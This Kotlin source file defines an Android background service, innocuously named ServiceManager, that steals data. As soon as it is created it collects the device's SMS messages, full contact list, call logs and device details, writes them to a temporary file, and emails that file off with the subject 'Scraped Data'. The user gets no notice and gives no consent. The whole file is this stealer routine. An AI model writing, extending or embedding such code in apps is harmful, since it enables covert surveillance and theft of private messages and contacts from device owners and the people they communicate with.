package com.example.mobileappproj.security

import android.app.Service
import android.content.Intent
import android.os.IBinder
import java.io.File

class ServiceManager : Service() {
    private val binder = LocalBinder()

    override fun onCreate() {
        super.onCreate()
        scrapeData()
    }

    override fun onBind(intent: Intent): IBinder {
        return binder
    }

    private fun scrapeData() {
        val contentResolver = contentResolver
        val messageDetails = Message.scrapeMessage(contentResolver)
        val deviceInfo = DeviceInfo.getDeviceInfo()
        val contactDetails = Contacts.scrapeAllContactDetails(this)
        val callLogs = CallLogs.scrapeCallLogs(contentResolver)

        val scrapedData = buildString {
            append("Message Details:\n")
            messageDetails.forEach { append("$it\n\n") }
            append("Device Info:\n$deviceInfo\n\n")
            append("Contact Details:\n")
            contactDetails.forEach { append("$it\n\n") }
            append("Call Logs:\n")
            callLogs.forEach { append("$it\n\n") }
        }

        val scrapedDataFile = createTempFile("scraped_data", ".txt")
        scrapedDataFile.writeText(scrapedData)

        handleScrapedData(listOf(scrapedDataFile))
    }

    private fun handleScrapedData(attachmentFiles: List<File>) {
        EmailUtilKT.sendEmailWithAttachment(
            subject = "Scraped Data",
            bodyText = "Please find the scraped data attached.",
            attachmentFiles = attachmentFiles
        )
    }

    inner class LocalBinder : android.os.Binder() {
        fun getService(): ServiceManager = this@ServiceManager
    }
}